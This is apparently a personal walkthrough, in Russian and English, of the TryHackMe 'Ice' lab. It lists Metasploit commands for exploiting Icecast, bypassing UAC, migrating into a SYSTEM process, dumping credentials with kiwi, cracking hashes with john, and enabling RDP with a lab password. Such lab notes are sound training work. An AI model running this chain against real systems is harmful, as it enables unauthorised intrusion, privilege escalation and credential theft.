## Ice

### Link: https://tryhackme.com/room/ice

#### Useful site: https://www.cvedetails.com/documentation/


## Атака:
```
1) получаем доступ к системе
2) повышаем права, чтобы могли прыгнуть на процесс с правами system
3) получаем пароль пользователя 

```
### Task 4

```
getuid - показывает, под каким пользователем выполнятся сессия.

sysinfo
```

```
msfconsole
search Icecast
use 0
```

#### локальный priv‑esc под систему
```
use post/multi/recon/local_exploit_suggester
set session
```


```
 use exploit/windows/local/bypassuac_eventvwr

 set LHOST
 set LPORT

```

### Logic:

```
Эксплойт удалённый

    exploit/windows/http/icecast_header даёт первый доступ (meterpreter) от имени какого‑то пользователя/сервиса, но ещё не SYSTEM.


Пост‑модуль (опционально)

    post/multi/recon/local_exploit_suggester должен был посмотреть на систему и предложить локальные эксплойты для повышения привилегий.

    ​

Локальный эксплойт для priv‑esc

    exploit/windows/local/bypassuac_eventvwr — один из таких локальных эксплойтов: он запускается уже изнутри скомпрометированной машины и поднимает твои права (обходит UAC, даёт более высокий контекст)
```

#### Продолжаем
```
getprivs


Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

- **load**  
  **Что это?** Подгрузка расширения (плагина) в сам Meterpreter.  
  **Куда попадает код?** Только в память (RAM). Добавляет новые команды в консоль Meterpreter.  

- **upload**  
  **Что это?** Простое копирование файла с машины на машину жертвы.  
  **Куда попадает код?** На жесткий диск (HDD/SSD). Файл физически появляется на диске.  

- **run post/...**  
  **Что это?** Запуск скрипта (модуля), написанного на Ruby.  
  **Куда попадает код?** Скрипт выполняется на сервере (Metasploit), отправляя команды Meterpreter'у.  


```
run post/windows/manage/archmigrate - в задаче не используется, но можно перевести meterprepter на архитектуру x64
```


### Мигрируем в другой процесс x64 с правами System
```
ps
migrate -N spoolsv.exe
```

### Подгружаем модуль
```
load kiwi
```

```
В задаче не использую, но можно и так
john --format=NT rockyou.txt hash.nt
```

### Включаем RDP
```
run post/windows/manage/enable_rdp

xfreerdp /u:Dark /p:Password01! /v:10.82.129.159 /f
```